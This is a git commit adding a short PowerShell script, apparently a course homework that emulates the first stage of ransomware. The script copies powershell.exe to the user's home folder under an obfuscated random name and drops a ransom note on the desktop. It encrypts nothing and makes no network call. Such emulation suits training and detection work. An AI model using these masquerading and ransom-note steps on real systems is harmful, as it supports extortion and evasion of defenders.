b0470b3f5b7b025f3ffb96f9955923ee7186e557
Fearherbs1 <fearherbs1@gmail.com>
2022-03-31 13:47:06 -0400

    week 10 hw

---
+++ Week10/homework/autiello_step1.ps1
@@ -0,0 +1,29 @@
+# set up our random number that maches the intel
+$rand = Get-Random -Minimum 1000 -Maximum 9876
+
+# make variable for the dest path
+$dest = "$env:USERPROFILE\EnNoB-$rand.exe"
+
+# copy the powershell executeable to our home dir with the obfuscated name.
+Copy-Item "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $dest
+
+# Check if the file exists, print an error if it does not
+if (Test-Path -Path $dest -PathType Leaf) {
+    Write-Output "Found PS exe"
+} else {
+    Write-Output "Error File Not found!"
+}
+
+
+# Uur ransom note
+$note = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."
+
+# Write the Ransom Note to the users desktop
+$note | Out-File -FilePath "$env:USERPROFILE\Desktop\README.READ"
+
+# Check if the readme exists, print an error if it does not
+if (Test-Path -Path "$env:USERPROFILE\Desktop\README.READ" -PathType Leaf) {
+    Write-Output "Found Ransom Note"
+} else {
+    Write-Output "Error File Not found!"
+}
